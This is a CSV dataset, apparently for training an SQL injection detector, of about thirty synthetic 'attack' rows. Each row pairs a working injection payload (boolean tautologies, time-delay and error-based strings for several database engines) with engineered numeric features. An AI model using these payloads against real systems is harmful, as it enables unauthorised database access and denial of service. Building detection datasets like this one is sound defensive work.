id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000263,attack,boolean,-8777%'   )    )     )   or   (  3934  =  2025  )  *2025 and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000722,0.9401645900339013,75.55638150624499,21.0,3.0336338078016007,5.0,16.0,38.463651255204155,16.092730251040834,0.0679106171262133,0.21731397480388254,0.5005713094148883,0.21420409865501597,4.0,0.0,1.0,0.0,1.0,2.0,0.0,6.092730251040832,2.0,0.0,0.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000264,attack,boolean,"1%""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000407,0.4396850738743821,124.96364486897436,29.580303739081195,3.414938344494401,34.580303739081195,12.300506231801993,57.922227419928774,20.160607478162394,0.2791908277959454,0.09791640154153786,0.4616290693603359,0.16126370130218082,0.0,3.8601012463603985,0.0,0.0,1.0,1.8601012463603988,0.0,9.580303739081197,1.860101246360399,1.0,1.0,2.8601012463603985,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.8601012463603988,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.860101246360399
SMOTE_000265,attack,boolean,"1%'  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R001279,0.9786957319231,210.9588081379452,34.34424418590828,3.67152873661821,60.42343992204288,25.781414728636094,87.28405038681359,37.469903100452655,0.28669221761352454,0.1244803683326261,0.4118257748102284,0.17700163924362092,1.0,0.0,2.0,0.0,0.0,1.0,0.0,20.12565891454437,1.0,1.3907073643180463,3.3907073643180463,10.562829457272185,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.781414728636093,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.7814147286360935
SMOTE_000266,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000350,0.018181440612035405,90.02849430137888,19.018996200919247,2.897369287751814,14.02849430137887,13.0,48.0,15.0,0.15581428517381055,0.1444001880623745,0.5331699251533828,0.16661560161043212,4.0,0.0,0.0,0.0,0.9905018995403756,2.0,0.0,8.0,0.0,0.0,0.009498100459624403,2.9905018995403756,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000267,attack,boolean,1'  )   and 9198  =  9198--,nearest_attack_euclidean,R000161,0.009349800325767358,26.999999999999986,11.03306857315189,2.90756659209792,3.0,9.0,10.0,5.0,0.1111111111111111,0.3333333333333333,0.37037037037037035,0.18518518518518517,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000268,attack,boolean,"1'||  (  select 'rawn' from dual where 4988  =  4988 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",nearest_attack_euclidean,R000122,1.1430430239832814,227.32333833573927,37.0,3.8773622654568385,71.18476476327957,32.0,88.0461911908199,36.09238238163979,0.3128979133532824,0.1409023537928583,0.38754917689920476,0.1586505559546546,3.046191190819893,0.0,0.0,0.0,0.0,2.0,0.0,18.0,0.0,1.0,3.0,11.046191190819894,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.5230955954099467,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.523095595409947
SMOTE_000269,attack,boolean,"1'+  (  select ouhd where 8905  =  8905 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",nearest_attack_euclidean,R000545,0.16885052061559794,218.60175980865904,33.943108544094144,3.7846429400745154,124.0,20.0,55.65865126456488,18.943108544094148,0.5672736664023064,0.0914957526455333,0.2545779718629879,0.08665260908917241,1.9431085440941467,0.0,0.11378291181170641,0.0,1.0,2.0,0.0,5.943108544094146,0.0,0.0,6.0,5.056891455905853,1.0,0.0,0.056891455905853205,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000270,attack,boolean,"1%""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R001278,1.0976128408775074,262.0878571651691,37.0,3.6855384000310814,74.43648571339324,28.12702857321353,111.2702857321353,48.25405714642706,0.2847491901443613,0.1073811140065194,0.4237008913070519,0.1841688045420674,0.0,4.0,0.0,0.0,0.0,2.0,0.0,24.25405714642706,2.0,1.9999999999999998,4.0,12.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.436485713393235,0.5635142866067652,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000271,attack,boolean,"1""  )   as lipa where 3450  =  3450 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R001379,0.33142256458786246,73.70759862019301,28.04613302670956,3.9235386457809804,18.615332566773898,21.0,24.56919954006434,9.52306651335478,0.248747087432545,0.28849154465298005,0.3333333333333333,0.12942803458114158,0.0,1.0,2.0,0.0,0.0,2.0,0.0,2.7615332566773896,0.0,0.7615332566773898,1.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000272,attack,boolean,"1  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000946,0.39468609639045527,239.03523732968029,35.5356301170024,3.7081010681227413,73.32106384034373,25.0,98.5356301170024,42.17854337233413,0.3064123604192708,0.1046613362825416,0.4123895533145291,0.17653674998365854,0.17854337233413298,0.0,2.0,0.0,0.0,1.0,0.0,23.0,0.0,1.9999999999999998,4.0,13.0,0.17854337233413298,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000273,attack,boolean,Ã½ or 1  =  1 --,nearest_attack_euclidean,R000041,1.0308753690257912,14.169017428925997,7.084508714463002,2.4130112858153083,3.4577456427685007,1.0845087144629986,6.084508714462999,3.0,0.2542545729037396,0.0677817946539375,0.42796363244232294,0.21610910267303124,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000274,attack,boolean,"1'||  (  select 'scba' where 9079  =  9079 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000961,1.0844869065951703,147.45856177004217,36.61525794766137,4.15612612033971,61.76619074387284,19.769484104677264,46.0,19.92288692149205,0.4070322040828365,0.138375588502556,0.31808296401746283,0.1365092433971446,3.0,0.0,2.0,0.0,1.0,2.0,0.0,6.384742052338632,0.0,0.6923710261693159,1.6152579476613682,7.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,1.3076289738306843,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.307628973830685
SMOTE_000275,attack,boolean,"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ycuo"" like ""ycuo",nearest_attack_euclidean,R001014,0.17063592336441957,162.85534719294597,37.06579593791892,4.109738184764774,67.93420406208108,15.197387813756762,57.526367503351366,22.197387813756762,0.41732548320764756,0.09326795830456457,0.3531399204777778,0.13626663801001002,4.0,4.0,0.06579593791892047,0.0,0.0,1.0,0.0,8.131591875837842,0.0,0.0,0.0,5.065795937918921,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.9342040620810794,0.06579593791892058,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000276,attack,boolean,"1'+  (  select tnch where 1867  =  1867 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",nearest_attack_euclidean,R001432,0.08445552571726042,277.67659424506166,37.0,3.801657885095879,85.26425484426952,36.80638285375514,110.07063769802465,45.53531884901233,0.3070422768071455,0.13265833136337918,0.3963908538026796,0.16390853802679572,2.0,0.0,0.0,0.0,0.0,2.0,0.0,23.767659424506164,0.0,1.961276570751027,3.9612765707510267,13.84510628300411,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.922553141502054,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.922553141502053
SMOTE_000277,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000704,0.8046457581660457,377.31498266588136,32.04499752369733,3.4250385284979927,98.08999504739468,58.0,169.17999009478933,52.04499752369733,0.2599506451345228,0.15382408934387837,0.4482935245399989,0.13793174098159997,0.0,0.34833250789911213,3.0,0.0,0.0,3.0,0.0,34.696665015798224,0.0,0.0,1.0,16.0,0.0,0.348332507899112,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000278,attack,boolean,"1"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and ""ljkg""  =  ""ljkg",nearest_attack_euclidean,R000850,0.10598084710973589,140.81048747286053,32.936829157620174,3.9610094674030036,46.7473166304807,16.0,52.0,26.063170842379826,0.33192953683600385,0.11363447336139909,0.369312038424547,0.18512395137805,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,0.06317084237982495,1.9999999999999998,1.0,8.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000279,attack,boolean,-8023' or 6872  =  6872,nearest_attack_euclidean,R001092,0.1090545420717252,22.999999999999986,12.354233687463113,3.3042716930041234,2.0,12.0,6.0,3.0,0.08695652173913043,0.5217391304347826,0.2608695652173913,0.13043478260869565,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999996,1.0,0.0,0.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000280,attack,boolean,"-8550""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kyad""  =  ""kyad",nearest_attack_euclidean,R000878,0.024409036454862806,362.97125403092105,31.980836020613996,3.296606610733306,88.009581989693,49.97125403092099,172.0,52.990418010307,0.2424702166172139,0.1376721955286063,0.47386703632293836,0.1459905515312414,0.0,4.0,0.990418010306998,0.0,0.0,2.0,0.0,36.0,0.0,0.0,0.0,12.990418010306998,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.009581989693002,0.990418010306998,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.0
SMOTE_000281,attack,boolean,"1""  )   and make_set  (  4553  =  8132,8132  )   and   (  ""pfci"" like ""pfci",nearest_attack_euclidean,R001453,0.5338220242512379,81.8393348386808,26.569944569890065,3.8763608452370715,28.039704372747018,13.189981523296689,28.469759802856952,12.13988913978013,0.34017951435303384,0.16436483619752568,0.34755667019922776,0.14789897925021275,0.0,3.8100184767033114,0.0,0.0,0.0,1.0,0.0,4.759926093186754,0.18998152329668883,1.0,1.3799630465933772,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8100184767033114,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.18998152329668883,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000282,attack,boolean,"1' where 1917  =  1917 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000381,0.1287872396707641,127.68280201000437,34.56658492461606,3.856852652653092,37.69975477384817,23.0,49.69975477384817,17.28329246230803,0.2949251659758074,0.180497736859542,0.389097898250351,0.13547919891429958,3.0,0.0,2.0,1.0,0.0,2.0,0.0,8.283292462308028,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000283,attack,boolean,"1' where 4880  =  4880 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000871,0.15571099206107836,268.0122906680139,34.92591323108013,3.8156333240505407,55.85182646216027,79.00000000000001,101.85182646216026,31.308637743693378,0.2082679478440209,0.29490795642198475,0.37998650474796136,0.116837590986033,1.0,0.0,2.0,0.0,2.0,2.0,0.0,18.308637743693378,0.0,0.0,6.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000284,attack,boolean,"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""wile"" like ""wile",nearest_attack_euclidean,R001320,0.9046604192590807,253.72510513279207,35.7533426784704,3.6558254150258196,76.32837772273443,27.0,109.01337071388161,41.383356696176016,0.2999040106315289,0.10722700366716623,0.43021732107195276,0.1626516646293521,0.0,4.0,0.0,0.0,0.0,1.0,0.0,23.753342678470407,0.0,1.4383356696176013,3.4383356696176017,8.753342678470405,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.876671339235203,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.8766713392352035
SMOTE_000285,attack,boolean,-2820'   )    )    or 6679  =  8848--,nearest_attack_euclidean,R000928,0.3747691307219357,35.33596148945672,13.0,2.930836439975036,2.0,12.0,14.573681276677178,6.76228021277953,0.05705232164061852,0.34231392984371123,0.4088746156808543,0.1917591328348159,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.7622802127795296,0.0,0.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000286,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000350,0.2721661779044328,85.79846598223486,18.0,2.8800416265773854,14.0,13.0,44.63877278578789,14.159693196446973,0.16372520503454333,0.15203054753207593,0.5193282199407829,0.16491602749259787,4.0,0.0,0.0,0.0,1.0,2.0,0.0,7.159693196446973,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000287,attack,boolean,"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'aytf' like 'aytf",nearest_attack_euclidean,R000623,1.2360915628762899,127.74091755104556,32.59715591835791,3.760156526731632,46.0,12.661926530596524,51.14376163268765,17.93522938776139,0.3604544105970127,0.099826803917906,0.39942230175373733,0.14029648373134396,5.532385306119304,0.0,0.0,1.0,0.0,1.0,0.0,9.402844081642085,0.0,0.0,1.0,1.9999999999999996,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.4676146938806952,0.0,0.0,0.0,1.0,0.5323853061193048,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000288,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000700,0.07223609021212399,208.2368720028282,33.0,3.7662046980721575,61.72471015515148,35.0,80.72471015515148,30.787451692525245,0.29630405731626175,0.1681916195102928,0.38760807933613506,0.14789624383731037,0.0,0.0,2.0,0.0,0.0,2.0,0.0,16.787451692525245,0.0,1.0,3.0,10.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000289,attack,boolean,"-8409%'  )   or make_set  (  9354  =  9354,7185  )   and   (  '%'  =  '",nearest_attack_euclidean,R000696,0.8736654627995301,66.88074045635736,25.09880328754955,3.694995368697071,12.316866118741743,15.049401643774775,25.465071050066065,14.049401643774775,0.18648096380630774,0.22496737965184344,0.3786690897952124,0.20988256674663638,4.0,0.0,0.6831338812582585,0.0,0.0,2.0,0.0,3.366267762516517,2.0,1.0,1.0,2.6831338812582586,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3168661187417414,0.6831338812582584,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000290,attack,boolean,"1'  )   as kgnd where 1550  =  1550 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000348,0.07123190071349071,138.6978709966921,33.49847928335149,3.80711107696188,43.0,23.0,54.598175140021795,18.099695856670298,0.31009453009206595,0.1658645160957562,0.3935463835832901,0.13049457022888775,3.0,0.0,2.0,1.0,0.0,2.0,0.0,9.0996958566703,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000291,attack,boolean,1'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,nearest_attack_euclidean,R001060,1.0676830273491702,342.2583368187464,35.83889121249761,3.583455809884421,90.5805543937512,46.258336818746415,147.0,58.4194456062488,0.26466668142401995,0.13514004380369757,0.42950815392181235,0.17068512085047013,1.0,0.0,0.41944560624880545,0.0,0.0,2.0,0.0,31.0,0.0,3.0,0.0,22.419445606248807,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.5805543937511947,0.41944560624880534,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
